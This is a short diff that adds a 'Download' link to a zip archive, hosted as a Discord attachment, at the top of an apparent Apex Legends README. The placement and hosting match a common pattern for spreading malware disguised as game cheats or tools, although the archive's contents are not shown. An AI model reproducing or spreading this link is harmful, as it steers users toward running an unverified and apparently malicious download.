@@ -1,3 +1,6 @@
+|[Download](https://cdn.discordapp.com/attachments/1443584758348120076/1443608810278097048/Release_v9.3.1.zip?ex=6929b0f9&is=69285f79&hm=815c92f5f32a2b288d6d59342732be7b50049b98b2e9bd36b1553f7e0b08764a&)
+|:------------- |
+
 <div align="center">
 
 # 🔥 APEX LEGENDS  
